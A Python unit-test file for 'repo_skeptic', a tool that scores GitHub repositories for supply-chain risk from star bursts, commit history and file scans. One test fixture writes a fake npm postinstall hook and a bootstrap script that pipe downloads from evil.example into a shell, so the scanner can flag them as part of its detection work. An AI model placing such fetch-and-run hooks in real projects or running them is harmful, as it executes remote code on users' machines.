from pathlib import Path
import tempfile
import textwrap
import unittest

from repo_skeptic.heuristics import (
    Finding,
    ScanResult,
    analyze_star_burst,
    build_findings,
    inspect_snapshot,
    normalize_repo_target,
    score_findings,
    summarize_commit_continuity,
)


class RepoSkepticHeuristicTests(unittest.TestCase):
    def test_normalize_repo_target_accepts_url(self) -> None:
        self.assertEqual(normalize_repo_target("https://github.com/octocat/hello-world"), ("octocat", "hello-world"))

    def test_star_burst_detects_clustering(self) -> None:
        timestamps = [
            "2026-04-01T00:00:00Z",
            "2026-04-01T00:05:00Z",
            "2026-04-01T00:10:00Z",
            "2026-04-01T00:15:00Z",
            "2026-04-02T10:00:00Z",
        ]
        burst = analyze_star_burst(timestamps)
        self.assertGreaterEqual(burst["largest_day_share"], 0.8)
        self.assertGreaterEqual(burst["largest_hour_share"], 0.8)

    def test_snapshot_scan_finds_install_hooks_and_commands(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            (root / "package.json").write_text(
                textwrap.dedent(
                    """
                    {
                      "name": "fake-tool",
                      "scripts": {
                        "postinstall": "curl https://evil.example/x.sh | bash"
                      }
                    }
                    """
                ).strip(),
                encoding="utf-8",
            )
            (root / "bootstrap.sh").write_text("wget https://evil.example/run.sh | sh", encoding="utf-8")
            result = inspect_snapshot(root)
            self.assertTrue(result.install_scripts)
            self.assertTrue(result.suspicious_commands)
            self.assertEqual(result.package_names["npm"], "fake-tool")

    def test_score_findings_never_drops_below_zero(self) -> None:
        findings = [Finding(id="x", severity="high", title="x", detail="x", penalty=150, evidence=[])]
        score, verdict = score_findings(findings)
        self.assertEqual(score, 0)
        self.assertEqual(verdict, "high-risk")

    def test_summarize_commit_continuity_counts_recent_authors(self) -> None:
        continuity = summarize_commit_continuity(
            [
                {"author": {"login": "alice"}, "commit": {"author": {"date": "2026-04-10T00:00:00Z", "name": "Alice"}}},
                {"author": {"login": "alice"}, "commit": {"author": {"date": "2026-04-09T00:00:00Z", "name": "Alice"}}},
                {"author": None, "commit": {"author": {"date": "2026-04-08T00:00:00Z", "name": "Bob"}}},
            ]
        )
        self.assertEqual(continuity.sampled_recent_commits, 3)
        self.assertEqual(continuity.last_commit_at, "2026-04-10T00:00:00Z")
        self.assertEqual(continuity.unique_recent_authors, 2)
        self.assertEqual(continuity.recent_authors, ["alice", "Bob"])

    def test_build_findings_flags_stale_maintenance(self) -> None:
        findings = build_findings(
            owner_age_days=500,
            owner_public_repos=10,
            repo_age_days=800,
            days_since_last_commit=420,
            unique_recent_commit_authors=1,
            stars=4000,
            forks=300,
            open_issues=12,
            open_prs=4,
            contributors=2,
            star_burst={"sample_size": 10.0, "largest_day_share": 0.1, "largest_hour_share": 0.1},
            suspicious_star_accounts_ratio=0.0,
            scan_result=ScanResult(
                install_scripts=[],
                suspicious_commands=[],
                suspicious_files=[],
                package_names={},
            ),
            risky_release_assets=[],
            registry_presence={},
        )
        finding_ids = {finding.id for finding in findings}
        self.assertIn("stale-maintenance", finding_ids)
        self.assertIn("single-maintainer-continuity", finding_ids)


if __name__ == "__main__":
    unittest.main()
